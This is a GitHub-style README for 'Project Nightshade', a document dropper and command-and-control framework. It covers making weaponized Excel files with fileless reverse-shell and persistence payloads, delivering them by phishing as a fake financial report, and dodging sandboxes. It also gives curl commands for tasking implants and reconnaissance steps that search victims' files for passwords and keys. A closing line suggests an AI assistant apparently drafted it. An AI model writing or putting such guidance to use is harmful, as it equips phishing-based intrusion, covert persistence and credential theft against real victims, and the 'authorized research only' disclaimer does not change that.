#  Project Nightshade - Advanced Document Dropper & C2 System

**Author:** ek0ms savi0r | **OPSEC Grade:** Midnight  
**A sophisticated penetration testing framework for authorized security research only.**

##  Overview

Project Nightshade is an advanced Document dropper system with integrated Command & Control (C2) capabilities. It creates weaponized Excel and PDF files that deploy in-memory, fileless payloads with multiple persistence mechanisms and encrypted communications.

##  Features

- **Multiple Payload Options**: Reverse Shell, RCE, Full C2 Agent
- **OPSEC-Focused**: Domain rotation, ngrok tunneling, anti-analysis checks
- **Encrypted Communications**: AES-256 encrypted C2 channels
- **Persistence**: Multiple persistence mechanisms (scheduled tasks, registry, WMI)
- **Stealth**: Fileless execution, memory-only payloads
- **Flexible Delivery**: Ngrok, domain rotation, or custom domains

##  Installation

### 1. Clone the Repository

```bash
git clone https://github.com/ekomsSavior/project_nightshade.git
cd project_nightshade
```

### 2. Install Dependencies

```bash
sudo apt update
pip3 install pycryptodome requests flask --break-system-packages
```

# Install ngrok (for tunneling)

```bash 
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

### 3. Authenticate Ngrok

```bash
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

##  Usage Guide

### Step 1: Start the C2 Server

```bash
# Start the Nightshade C2 server
python3 nightshade_staging.py

# Server will start on http://127.0.0.1:8080
# Reverse shell handler starts on port 4444
```

### Step 2: OPEN SECOND TERMINAL & Generate the Dropper

```bash
# Run the interactive dropper generator
cd project_nightshade
python3 nightshade_dropper.py
```

### Step 3: Follow the Interactive Prompts

**Payload Selection:**

- `1` - Reverse Shell (connects to C2 on port 4444)
- `2` - RCE + Persistence (uses HTTP C2 endpoints)
- `3` - Full C2 Agent (advanced features)

**C2 Configuration:**

- For Reverse Shell: Use your server IP and port 4444
- For RCE/Full C2: Use your server IP and port 8080

**Delivery Method:**

- `1` - Ngrok tunneling (recommended)
- `2` - Domain rotation
- `3` - Custom domain

### Step 4: Deploy the Excel File

- Deliver the generated Excel file via phishing campaign
- The file will be named according to your choice (default: `Financial_Report_Q3.xlsx`)

## C2 Operations

### After Successful Execution:

#### For Reverse Shell Payload:

```bash
# The C2 server automatically handles reverse shell connections
# You'll see connections in the C2 server console

# Available endpoints for monitoring:
curl http://127.0.0.1:8080/c2/sessions
```

#### For RCE/Full C2 Payload:

```bash
# View active sessions
curl http://127.0.0.1:8080/c2/sessions

# Send commands to a session
curl -X POST http://127.0.0.1:8080/c2/command \
  -H "Content-Type: application/json" \
  -d '{"session_id": "SESSION_ID_HERE", "command": "whoami"}'

# View server statistics
curl http://127.0.0.1:8080/admin/stats
```

### Example C2 Commands:

```bash
# System information
systeminfo
whoami /all

# Network reconnaissance
ipconfig /all
netstat -ano

# Lateral movement
net view
net user

# Data collection
dir C:\\Users\\ /s | findstr "password|secret|key"
```

##  OPSEC Considerations

### Ngrok Tunneling:

```bash
# Rotate tunnels regularly
ngrok http 8080 --region eu --subdomain your-custom-subdomain
# Use different regions for resilience
# Available regions: us, eu, au, ap, sa, jp, in
```

### Domain Rotation:
- The system includes built-in domain rotation
- Uses multiple benign-looking domains for template delivery
- Automatically cycles through domains for OPSEC

### Anti-Analysis Features:
- Sandbox detection
- VM detection
- Debugger detection
- Blacklisted process checking

##  Advanced Configuration

### Customizing C2 Server:

Edit `nightshade_c2_server.py` configuration:

```python
class StagingConfig:
    PORT = 8080
    HOST = '0.0.0.0'
    REVERSE_SHELL_PORT = 4444
    USE_NGROK = True
    ENCRYPTION_KEY = 'your-custom-encryption-key'
```

### Customizing Dropper:

Edit `nightshade_dropper.py` configuration:

```python
STAGING_DOMAINS = [
    'your-custom-domain-1.com',
    'your-custom-domain-2.net',
    # Add your own domains
]
```

##  Legal & Ethical Notice

**FOR AUTHORIZED SECURITY RESEARCH ONLY**

 **This tool is intended for:**
- Penetration testing with explicit permission
- Security research in controlled environments
- Educational purposes in ethical hacking courses

 **Do NOT use for:**
- Unauthorized testing
- Malicious activities
- Any illegal purposes

ek0ms savi0r assumes no liability and is not responsible for any misuse or damage caused by this program.

## Troubleshooting

### Common Issues:

**Excel file not loading template:**
- Check if C2 server is running
- Verify network connectivity
- Check firewall settings


##  Pro Tips

1. **Use Ngrok for Quick Tests**: Perfect for demonstrations and quick engagements
2. **Domain Rotation for Persistence**: Use custom domains for longer campaigns
3. **Monitor C2 Dashboard**: Regularly check `/c2/sessions` for active implants
4. **Rotate Encryption Keys**: Change default encryption keys for operations
5. **Use Multiple Regions**: Spread ngrok tunnels across different regions

---


## DISCLAIMER: 

Always operate within legal boundaries and with proper authorization. This tool is powerful and should be used responsibly by security professionals.


**ek0ms savi0r**

---

This README provides everything you need to get started, love! It includes installation instructions, usage guide, OPSEC considerations, and ethical guidelines. Perfect for your GitHub repository! 🚀💕
